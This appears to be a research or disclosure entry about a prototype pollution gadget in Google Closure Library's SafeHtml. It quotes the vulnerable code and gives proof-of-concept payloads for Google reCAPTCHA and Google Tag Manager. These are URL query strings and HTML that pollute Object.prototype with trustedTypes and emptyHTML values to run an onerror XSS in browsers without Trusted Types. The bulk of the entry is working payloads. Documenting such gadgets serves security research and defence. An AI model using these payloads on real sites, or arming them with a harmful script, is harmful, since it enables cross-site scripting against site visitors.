## Google Closure

Closure Library is a powerful, low-level JavaScript library designed for building complex and scalable web applications. 
It is used by many Google web applications, such as Google Search, Gmail, Google Docs, Google+, Google Maps, and others.

**The vulnerability can be exploited in browsers that do not support Trusted Types. For example, FireFox.**

### URL

https://github.com/google/closure-library

### Vulnerable code fragment

https://github.com/google/closure-library/blob/96a4b269b9ad15c008a392e5b59fe66fcf66b526/closure/goog/html/safehtml.js#L1066-L1067

```js
SafeHtml.EMPTY = new SafeHtml(
    (goog.global.trustedTypes && goog.global.trustedTypes.emptyHTML) || '',
```

### PoC

#### Google reCAPTCHA

```
?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror%3dalert(1)>
```

```html
<script>
    Object.prototype.trustedTypes = "x";
    Object.prototype.emptyHTML = "<img/src/onerror=alert(1)>";
</script>
<script src="https://www.google.com/recaptcha/api.js"></script>
<div class="g-recaptcha" data-sitekey="your-site-key"/>
```

#### Google Tag Manager + Custom HTML Tag

```
?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror%3dalert(1)>
```

```html
<script>
    Object.prototype.trustedTypes = "x";
    Object.prototype.emptyHTML = "<img/src/onerror=alert(1)>";
</script>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-WSPXXTG');</script>
```
